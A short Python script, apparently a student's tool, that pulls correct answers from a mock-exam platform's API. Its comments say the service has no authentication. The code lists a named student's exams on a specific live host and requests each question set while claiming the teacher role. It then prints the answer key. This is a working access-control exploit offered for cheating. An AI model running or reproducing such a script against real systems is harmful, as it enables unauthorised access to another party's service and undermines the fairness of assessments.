import requests

"""
    由于范刘帅没做鉴权,
    导致可以直接请求api拿到答案,
    所以做了这个东西
    designed by Potpot123 | Made in Shanghai (Doge
"""

print("NEBS 模拟考试平台答案获取脚本")
print("模考可以用这个, 但是大考用不了, 所以请在已经有能力5分的情况下再使用本脚本以节省时间")

name=input("输入你的名字")
# get exam list
data=requests.get("http://simon.nekko.cn:1234/api/student/exams", params={'student_name':name}).json()
# choose
for index in range(0,len(data)):
    print(index+1,data[index]["exam"]["name"])
choice=int(input("输入你要查询答案的作业编号"))

# get particular exam info
response = requests.get('http://simon.nekko.cn:1234//api/questions/'+data[choice-1]["exam"]["id"], params={'role':'teacher'})
data=response.json()

# list the answer
for question in data:
    print(question["order_idx"]+1,question["choices"][question["correct_answer"]])
